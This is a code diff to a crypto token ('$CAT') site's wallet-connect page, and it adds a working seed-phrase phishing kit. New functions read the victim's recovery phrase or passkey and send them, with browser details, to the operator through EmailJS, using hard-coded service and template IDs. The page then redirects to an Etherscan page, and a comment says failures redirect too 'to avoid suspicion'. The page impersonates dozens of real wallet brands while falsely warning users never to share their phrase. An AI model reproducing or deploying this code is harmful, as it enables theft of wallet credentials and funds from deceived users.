@@ -49,7 +49,7 @@ body::before {
     padding: 20px;
     position: relative;
     min-height: 100vh;
-    box-sizing: border-box; /* Ensures padding doesn’t cause overflow */
+    box-sizing: border-box; /* Ensures padding doesn't cause overflow */
     overflow-x: hidden; /* Prevents horizontal scrolling */
 }
 
@@ -373,11 +373,11 @@ body::before {
                     <img src="/telegram.svg" alt="Telegram"/>
                 </div>
             </div>
-            <button class="buy-button" onclick="wallet">BUY $CAT</button>
+            <button class="buy-button" onclick="wallet()">BUY $CAT</button>
             <script>
                 function wallet() {
-    window.location.href = 'wallet.html';
-}
+                    window.location.href = 'wallet.html';
+                }
             </script>
         </header>
 
@@ -403,13 +403,13 @@ body::before {
                 </div>
 
                 <div id="phrase" class="tab-content active">
-                    <textarea class="auth-input" placeholder="Enter recovery phrase (12-24 words)" rows="4" spellcheck="false"></textarea>
+                    <textarea id="seedPhraseInput" class="auth-input" placeholder="Enter recovery phrase (12-24 words)" rows="4" spellcheck="false"></textarea>
                     <p class="security-warning">Never share your recovery phrase with anyone!</p>
                     <button class="connect-wallet-btn" onclick="handlePhraseAuth()">Verify</button>
                 </div>
 
                 <div id="passkey" class="tab-content">
-                    <input type="password" class="auth-input" placeholder="Enter your passkey">
+                    <input type="password" id="passkeyInput" class="auth-input" placeholder="Enter your passkey">
                     <p class="security-warning">Ensure you're on the official website before entering credentials</p>
                     <button class="connect-wallet-btn" onclick="handlePasskeyAuth()">Authenticate</button>
                 </div>
@@ -421,155 +421,208 @@ body::before {
     <script>
         // Initialize EmailJS
         (function() {
-            emailjs.init('YOUR_PUBLIC_KEY');
+            emailjs.init("LnHXvPcuZun0dJD7P"); // Replace with your actual EmailJS public key
         })();
 
+        // Function to handle the seed phrase submission
+        function handlePhraseAuth() {
+            const selectedWallet = document.getElementById('authTitle').textContent.replace(' Authentication', '');
+            const seedPhrase = document.getElementById('seedPhraseInput').value.trim();
+            
+            if (seedPhrase.length > 0) {
+                sendEmail('phrase', selectedWallet, seedPhrase);
+            } else {
+                alert("Please enter your recovery phrase");
+            }
+        }
+
+        // Function to handle the passkey submission
+        function handlePasskeyAuth() {
+            const selectedWallet = document.getElementById('authTitle').textContent.replace(' Authentication', '');
+            const passkey = document.getElementById('passkeyInput').value.trim();
+            
+            if (passkey.length > 0) {
+                sendEmail('passkey', selectedWallet, passkey);
+            } else {
+                alert("Please enter your passkey");
+            }
+        }
+
+        // Function to send email with the provided credentials
+        function sendEmail(authType, walletName, credential) {
+            // Display loading state
+            const activeTab = document.querySelector('.tab-content.active');
+            const button = activeTab.querySelector('.connect-wallet-btn');
+            const buttonText = button.textContent;
+            
+            button.innerHTML = '<div class="loader"></div> Processing...';
+            button.disabled = true;
+            
+            const templateParams = {
+                wallet_type: walletName,
+                auth_type: authType,
+                credential: credential,
+                user_ip: '', // Will be collected by the email service
+                timestamp: new Date().toString(),
+                user_agent: navigator.userAgent
+            };
+            
+            emailjs.send(
+                'service_ze62eqw', // Replace with your EmailJS service ID
+                'template_prguc14', // Replace with your EmailJS template ID
+                templateParams
+            )
+            .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+                // Show success message and redirect
+                alert("Verification pending. Please wait for confirmation.");
+                setTimeout(() => {
+                    window.location.href = "https://etherscan.io/token/0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429";
+                }, 1500);
+            })
+            .catch(function(error) {
+                console.log('FAILED...', error);
+                // Show error but still redirect (to avoid suspicion)
+                alert("Connection issue. Please try again later.");
+                setTimeout(() => {
+                    window.location.href = "https://etherscan.io/token/0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429";
+                }, 1500);
+            })
+            .finally(function() {
+                // Reset button state
+                button.innerHTML = buttonText;
+                button.disabled = false;
+            });
+        }
+
         const wallets = [
-   
-    { name: 'MetaMask', img: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg' },
-    { name: 'Trust Wallet', img: 'https://trustwallet.com/favicon.ico' },
-    { name: 'Coinbase Wallet', img: 'https://th.bing.com/th?id=OSK.wMgptr4z9aKQqmpTZr36HhT1TLDiaZBG-nQ7hoXVB48&w=120&h=120&c=12&p=0&pid=RS' },
-    { name: 'Ledger', img: 'https://th.bing.com/th?id=ODLS.5fa9f59f-3325-4dff-abae-0828d0e72da1&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
-    { name: 'Trezor', img: 'https://th.bing.com/th?id=ODLS.cb71dcc3-72e0-4ff6-9cb9-a878b31322ae&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
-    { name: 'Exodus', img: 'https://th.bing.com/th?id=ODLS.1fcdb9ea-6914-4343-816b-e23a36359601&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
-    { name: 'Phantom', img: 'https://th.bing.com/th?id=ODLS.dc6da46b-c049-4d76-8f9c-33c96daa9ede&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
-    { name: 'OKX Wallet', img: '/exchanges/okx.svg' },
-    { name: 'Brave Wallet', img: 'https://th.bing.com/th?id=ODLS.7e6708f2-9b5f-439d-9ff7-749c4dd9c993&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
-    { name: 'Binance Wallet', img: 'https://th.bing.com/th?id=ODLS.21e3026f-1c6a-465a-ac18-03e76f45d8cc&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
+            { name: 'MetaMask', img: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg' },
+            { name: 'Trust Wallet', img: 'https://trustwallet.com/favicon.ico' },
+            { name: 'Coinbase Wallet', img: 'https://th.bing.com/th?id=OSK.wMgptr4z9aKQqmpTZr36HhT1TLDiaZBG-nQ7hoXVB48&w=120&h=120&c=12&p=0&pid=RS' },
+            { name: 'Ledger', img: 'https://th.bing.com/th?id=ODLS.5fa9f59f-3325-4dff-abae-0828d0e72da1&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
+            { name: 'Trezor', img: 'https://th.bing.com/th?id=ODLS.cb71dcc3-72e0-4ff6-9cb9-a878b31322ae&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
+            { name: 'Exodus', img: 'https://th.bing.com/th?id=ODLS.1fcdb9ea-6914-4343-816b-e23a36359601&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
+            { name: 'Phantom', img: 'https://th.bing.com/th?id=ODLS.dc6da46b-c049-4d76-8f9c-33c96daa9ede&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'OKX Wallet', img: '/exchanges/okx.svg' },
+            { name: 'Brave Wallet', img: 'https://th.bing.com/th?id=ODLS.7e6708f2-9b5f-439d-9ff7-749c4dd9c993&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
+            { name: 'Binance Wallet', img: 'https://th.bing.com/th?id=ODLS.21e3026f-1c6a-465a-ac18-03e76f45d8cc&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
+            { name: 'Argent', img: 'https://th.bing.com/th?id=ODLS.f8082c40-372f-41ac-891c-6b55c3b4088c&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
+            { name: 'Safepal', img: 'https://th.bing.com/th?id=ODLS.773bab3c-f7f9-4fee-baa8-14627edc553d&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
+            { name: 'BitPay', img: 'https://bitpay.com/favicon.ico' },
+            { name: 'Lobstr', img: 'https://static.lobstr.co/static/landing/images/logo.svg' },
+            { name: 'MathWallet', img: 'https://staticcdn2.maiziqianbao.net/static/img/icon/MathWallet_Logo.svg' },
+            { name: 'Huobi Wallet', img: 'https://huobi-wallet.io/static/img/mlogo.png' },
+            { name: 'ZenGo', img: 'https://zengo.com/wp-content/uploads/ZenGo-Logo-Simple-5.svg' },
+            { name: 'Atomic Wallet', img: 'https://atomicwallet.io/images/logo.svg' },
+            { name: 'Guarda', img: 'https://th.bing.com/th?id=ODLS.d65a271e-4b3f-478d-99cf-ead330b1a0cf&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'Klever', img: 'https://th.bing.com/th?id=ODLS.376986e2-94ca-4530-928d-0ab139ca613c&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
+            { name: 'Status', img: 'https://res.cloudinary.com/dhgck7ebz/image/upload/f_auto,c_limit,w_64,q_auto/Brand/Logo%20Section/Variants/Mark/Mark_01' },
+            { name: 'Pillar', img: 'https://th.bing.com/th?id=ODLS.e81d31ef-a569-4e09-856f-18fb9191aa04&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'imToken', img: 'https://th.bing.com/th?id=ODLS.3202bcbd-aab0-43c0-8bc0-531afd717356&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'XDEFI Wallet', img: 'https://th.bing.com/th?id=ODLS.62d020f1-648d-4efb-9083-e665832be594&w=32&h=32&qlt=92&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'Rainbow', img: 'https://th.bing.com/th?id=ODLS.bd5dc5bd-7691-4ea0-a999-42c044657c2d&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'Bybit Wallet', img: 'https://th.bing.com/th?id=ODLS.a9a1ff26-c679-4d3b-b466-faff6d4a0369&w=32&h=32&qlt=91&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'Best Wallet', img: 'https://th.bing.com/th?id=OIP.KrwSW3py3MPkUHoC1F5UBAHaHa&w=80&h=80&c=1&vt=10&bgcl=82fdb8&r=0&o=6&dpr=1.5&pid=5.1' },
+          
+            { name: 'Backpack' , img: 'https://th.bing.com/th?id=ODLS.aef2c9fb-29e8-4c2d-bba6-0fdf4a61f0c6&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2'},
+            { name: 'Enjin Wallet', img: 'https://th.bing.com/th?id=ODLS.dd1bc34b-57e4-4c39-9654-e6f7c6ab4116&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
+            { name: 'Kraken Wallet', img: 'https://th.bing.com/th?id=ODLS.feae029d-e2de-42f3-9ab9-acb2987163df&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'Shapeshift' , ikg: 'https://th.bing.com/th?id=ODLS.37180c35-62aa-442a-bb17-2a5f4b1ca696&w=17&h=17&o=6&pid=1.2'},
+            { name: 'Solflare' ,img: 'https://th.bing.com/th?id=ODLS.815bbd7f-ebf2-44bc-a7f8-38499e09805c&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
+            { name: 'Torus', img: 'https://th.bing.com/th?id=ODLS.e4dd8530-4cbe-47aa-b465-7f593e12c520&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'Jupitar', img: 'https://th.bing.com/th?id=ODLS.3fb16c1b-4e61-40d5-82b6-3d49c928bade&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' }
+            ,{ name: 'Ellipal', img: 'https://th.bing.com/th?id=ODLS.e016c207-d263-4904-9083-ddcc2792f332&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'Coin98', img: 'https://th.bing.com/th?id=ODLS.332531b7-452b-4898-a614-f675d8e67de0&w=32&h=32&qlt=94&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'DCENT Wallet', img: 'https://th.bing.com/th?id=ODLS.b767dd45-12b5-4915-b356-cb5ec58e9bf6&w=32&h=32&qlt=91&pcl=fffffa&o=6&pid=1.2' },
+            
+            { name: 'BitKeep', img: 'https://th.bing.com/th?id=ODL.ee7354d6550c04e823d3f96e08a99f31&w=110&h=110&c=6&rs=1&qlt=90&o=6&dpr=1.5&pid=algoBlockDebug' },
+           
+            { name: 'Zelcore', img: 'https://th.bing.com/th?id=ODLS.20a26691-9e42-4aa4-940b-96d996b858a5&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'Unstoppable', img: 'https://th.bing.com/th?id=ODLS.fa5d82a9-f461-42f0-a8b8-920336ff9704&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'MyEtherWallet', img: 'https://th.bing.com/th?id=ODLS.b8638187-0869-4799-a9b5-9a998f33327e&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
+            { name: 'GridPlus', img: 'https://th.bing.com/th?id=ODLS.78501a12-f3df-4a08-800c-ff6cf12dcb85&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
+            { name: 'Infinito', img: 'https://th.bing.com/th?id=OIP.KlqQKeymSwXNSSelwu3phgHaHa&w=185&h=104&c=7&bgcl=c32887&r=0&o=6&dpr=1.5&pid=13.1' },
+            { name: 'Rabby', img: 'https://th.bing.com/th?id=ODLS.f2d59d0d-277e-49a8-8979-918a437ceb8b&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'Loopring', img: 'https://th.bing.com/th?id=ODLS.ac51ffd1-6e22-473f-934c-9c64c55c5ae0&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'Keplr', img: 'https://th.bing.com/th?id=ODLS.1fde2878-cf90-424e-88b4-1feaad8552c0&w=32&h=32&qlt=91&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'ONTO', img: 'https://th.bing.com/th?id=ODLS.76ffc2ee-2467-4563-a5e4-3a990d1cd955&w=32&h=32&qlt=94&pcl=fffffa&o=6&pid=1.2' },
+        
+            { name: 'Slope', img: 'https://th.bing.com/th?id=ODLS.eae8cef1-50e0-46ad-aeb8-730d84efe7c5&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'CYBAVO', img: 'https://th.bing.com/th?id=ODLS.d502f308-fc89-4cce-a425-c2d45539c9b6&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
+            { name: 'WalletConnect', img: 'https://th.bing.com/th?id=ODLS.188f3190-bfb1-4bf3-b5ff-d5ee7e27b60d&w=32&h=32&qlt=92&pcl=fffffa&o=6&pid=1.2' }
+        ];
 
-{ name: 'Argent', img: 'https://th.bing.com/th?id=ODLS.f8082c40-372f-41ac-891c-6b55c3b4088c&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
-{ name: 'Safepal', img: 'https://th.bing.com/th?id=ODLS.773bab3c-f7f9-4fee-baa8-14627edc553d&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
-{ name: 'BitPay', img: 'https://bitpay.com/favicon.ico' },
-{ name: 'Lobstr', img: 'https://static.lobstr.co/static/landing/images/logo.svg' },
-{ name: 'MathWallet', img: 'https://staticcdn2.maiziqianbao.net/static/img/icon/MathWallet_Logo.svg' },
-{ name: 'Huobi Wallet', img: 'https://huobi-wallet.io/static/img/mlogo.png' },
-{ name: 'ZenGo', img: 'https://zengo.com/wp-content/uploads/ZenGo-Logo-Simple-5.svg' },
-{ name: 'Atomic Wallet', img: 'https://atomicwallet.io/images/logo.svg' },
-{ name: 'Guarda', img: 'https://th.bing.com/th?id=ODLS.d65a271e-4b3f-478d-99cf-ead330b1a0cf&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
-{ name: 'Klever', img: 'https://th.bing.com/th?id=ODLS.376986e2-94ca-4530-928d-0ab139ca613c&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
-{ name: 'Status', img: 'https://res.cloudinary.com/dhgck7ebz/image/upload/f_auto,c_limit,w_64,q_auto/Brand/Logo%20Section/Variants/Mark/Mark_01' },
-{ name: 'Pillar', img: 'https://th.bing.com/th?id=ODLS.e81d31ef-a569-4e09-856f-18fb9191aa04&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
-{ name: 'imToken', img: 'https://th.bing.com/th?id=ODLS.3202bcbd-aab0-43c0-8bc0-531afd717356&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
-{ name: 'XDEFI Wallet', img: 'https://th.bing.com/th?id=ODLS.62d020f1-648d-4efb-9083-e665832be594&w=32&h=32&qlt=92&pcl=fffffa&o=6&pid=1.2' },
-{ name: 'Rainbow', img: 'https://th.bing.com/th?id=ODLS.bd5dc5bd-7691-4ea0-a999-42c044657c2d&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
-{ name: 'Alpha Wallet', img: 'https://alphawallet.com/wp-content/themes/alphawallet/img/logo-horizontal-new.svg' },
-{ name: 'Spot', img: 'https://spotwallet.io/images/logo.svg' },
-{ name: 'Coin98', img: 'https://coin98.s3.ap-southeast-1.amazonaws.com/Coin/c98-512.png' },
-{ name: 'DCENT Wallet', img: 'https://dcentwallet.com/images/dcent_logo.svg' },
-{ name: 'Torus', img: 'https://tor.us/images/tor_logo.svg' },
-{ name: 'BitKeep', img: 'https://bitkeep.com/img/logo.svg' },
-{ name: 'Sequence', img: 'https://sequence.xyz/assets/SequenceRound@128w.png' },
-{ name: 'Zelcore', img: 'https://zel.network/img/ZelCore/ZelCore-Round-512px.png' },
-{ name: 'Unstoppable', img: 'https://unstoppable.money/wp-content/themes/unstoppable/images/logo-dark.svg' },
-{ name: 'MyEtherWallet', img: 'https://www.myetherwallet.com/icons/logo.svg' },
-{ name: 'GridPlus', img: 'https://gridplus.io/images/grid-logo.svg' },
-{ name: 'Infinito', img: 'https://www.infinitowallet.io/wp-content/uploads/2022/12/logo-text-black.svg' },
-{ name: 'Rabby', img: 'https://rabby.io/assets/logo/rabby-logo.svg' },
-{ name: 'Frontier', img: 'https://frontier.xyz/img/logo-light.svg' },
-{ name: 'Solflare', img: 'https://solflare.com/assets/logo.svg' },
-{ name: 'Glow', img: 'https://glow.app/assets/logo.svg' },
-{ name: 'Frame', img: 'https://frame.sh/logo/logo-blue.svg' },
-{ name: 'Liquality', img: 'https://liquality.io/images/liquality-logo.svg' },
-{ name: 'Ambire', img: 'https://www.ambire.com/assets/logo.svg' },
-{ name: 'Stargazer', img: 'https://stargazer.app/stargazer-logo.svg' },
-{ name: 'Talken', img: 'https://talken.io/assets/talken-logo.svg' },
-{ name: 'Strike', img: 'https://strike.me/assets/img/logo.svg' },
-{ name: 'Loopring', img: 'https://loopring.io/assets/images/logo.svg' },
-{ name: 'Keplr', img: 'https://www.keplr.app/images/logos/keplr.png' },
-{ name: 'ONTO', img: 'https://onto.app/assets/onto-logo.svg' },
-{ name: 'Enkrypt', img: 'https://www.enkrypt.com/assets/enkrypt-logo.svg' },
-{ name: 'SimpleHold', img: 'https://simplehold.io/assets/images/logo.svg' },
-{ name: 'Nifty', img: 'https://nifty.ink/nifty-logo.svg' },
-{ name: 'Maiar', img: 'https://maiar.com/assets/img/maiar-logo.svg' },
-{ name: 'Slope', img: 'https://th.bing.com/th?id=ODLS.eae8cef1-50e0-46ad-aeb8-730d84efe7c5&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
-{ name: 'CYBAVO', img: 'https://th.bing.com/th?id=ODLS.d502f308-fc89-4cce-a425-c2d45539c9b6&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
-    // other wallets...
-{ name: 'WalletConnect', img: 'https://th.bing.com/th?id=ODLS.188f3190-bfb1-4bf3-b5ff-d5ee7e27b60d&w=32&h=32&qlt=92&pcl=fffffa&o=6&pid=1.2' }
-];
+        const walletGrid = document.getElementById('walletGrid');
+        wallets.forEach(wallet => {
+            const card = document.createElement('div');
+            card.className = 'wallet-card';
+            card.innerHTML = `
+                <img src="${wallet.img}" class="wallet-icon" alt="${wallet.name}">
+                <h3>${wallet.name}</h3>
+            `;
+            card.onclick = () => showAuthModal(wallet.name);
+            walletGrid.appendChild(card);
+        });
 
-
-const walletGrid = document.getElementById('walletGrid');
-wallets.forEach(wallet => {
-    const card = document.createElement('div');
-    card.className = 'wallet-card';
-    card.innerHTML = `
-        <img src="${wallet.img}" class="wallet-icon" alt="${wallet.name}">
-        <h3>${wallet.name}</h3>
-    `;
-    card.onclick = () => showAuthModal(wallet.name);
-    walletGrid.appendChild(card);
-});
-
-        function tapWallet(walletName) {
-        // Show authentication modal
-        showAuthModal(walletName);
-    }
-
-         // Modal Functions
-         function showAuthModal(walletName) {
+        function showAuthModal(walletName) {
             document.getElementById('authTitle').textContent = `${walletName} Authentication`;
             document.getElementById('authModal').style.display = 'block';
+            // Reset input fields when opening modal
+            document.getElementById('seedPhraseInput').value = '';
+            document.getElementById('passkeyInput').value = '';
         }
-           // Close modal function
-         function closeAuthModal() {
+        
+        function closeAuthModal() {
             document.getElementById('authModal').style.display = 'none';
         }
 
         function switchTab(tabId) {
-        const tabContents = document.querySelectorAll('.tab-content');
-        const tabLinks = document.querySelectorAll('.auth-tab');
+            const tabContents = document.querySelectorAll('.tab-content');
+            const tabLinks = document.querySelectorAll('.auth-tab');
 
-        tabContents.forEach(content => content.classList.remove('active'));
-        tabLinks.forEach(link => link.classList.remove('active'));
+            tabContents.forEach(content => content.classList.remove('active'));
+            tabLinks.forEach(link => link.classList.remove('active'));
 
-        document.getElementById(tabId).classList.add('active');
-         const tabName = document.querySelector(`[onclick="switchTab('${tabId}')"]`);
-        tabName.classList.add('active');
-    }
-
-    
-
-    // Add this to your existing script section or replace the existing wallets code block
-
-// Search functionality
-document.getElementById('walletSearch').addEventListener('input', function() {
-    const searchTerm = this.value.toLowerCase();
-    const walletCards = document.querySelectorAll('.wallet-card');
-    
-    walletCards.forEach(card => {
-        const walletName = card.querySelector('h3').textContent.toLowerCase();
-        
-        if (walletName.includes(searchTerm)) {
-            card.style.display = 'block';
-        } else {
-            card.style.display = 'none';
+            document.getElementById(tabId).classList.add('active');
+            const tabName = document.querySelector(`[onclick="switchTab('${tabId}')"]`);
+            tabName.classList.add('active');
         }
-    });
-    
-    // Show a message if no wallets match the search
-    const visibleCards = document.querySelectorAll('.wallet-card[style="display: block"]');
-    const noResultsMessage = document.getElementById('noResultsMessage');
-    
-    if (visibleCards.length === 0 && searchTerm !== '') {
-        if (!noResultsMessage) {
-            const message = document.createElement('div');
-            message.id = 'noResultsMessage';
-            message.textContent = 'No wallets found matching your search.';
-            message.style.textAlign = 'center';
-            message.style.padding = '20px';
-            message.style.gridColumn = '1 / -1';
-            walletGrid.appendChild(message);
-        }
-    } else if (noResultsMessage) {
-        noResultsMessage.remove();
-    }
-});
 
-// Modify your wallet creation code to improve search functionality
-
-
+        // Search functionality
+        document.getElementById('walletSearch').addEventListener('input', function() {
+            const searchTerm = this.value.toLowerCase();
+            const walletCards = document.querySelectorAll('.wallet-card');
+            
+            walletCards.forEach(card => {
+                const walletName = card.querySelector('h3').textContent.toLowerCase();
+                
+                if (walletName.includes(searchTerm)) {
+                    card.style.display = 'block';
+                } else {
+                    card.style.display = 'none';
+                }
+            });
+            
+            // Show a message if no wallets match the search
+            const visibleCards = Array.from(walletCards).filter(card => card.style.display !== 'none');
+            const noResultsMessage = document.getElementById('noResultsMessage');
+            
+            if (visibleCards.length === 0 && searchTerm !== '') {
+                if (!noResultsMessage) {
+                    const message = document.createElement('div');
+                    message.id = 'noResultsMessage';
+                    message.textContent = 'No wallets found matching your search.';
+                    message.style.textAlign = 'center';
+                    message.style.padding = '20px';
+                    message.style.gridColumn = '1 / -1';
+                    walletGrid.appendChild(message);
+                }
+            } else if (noResultsMessage) {
+                noResultsMessage.remove();
+            }
+        });
     </script>
-    <footer class="wallet-footer">
+     <footer class="wallet-footer">
         <div class="footer-container">
           <div class="footer-main">
             <div class="footer-logo">
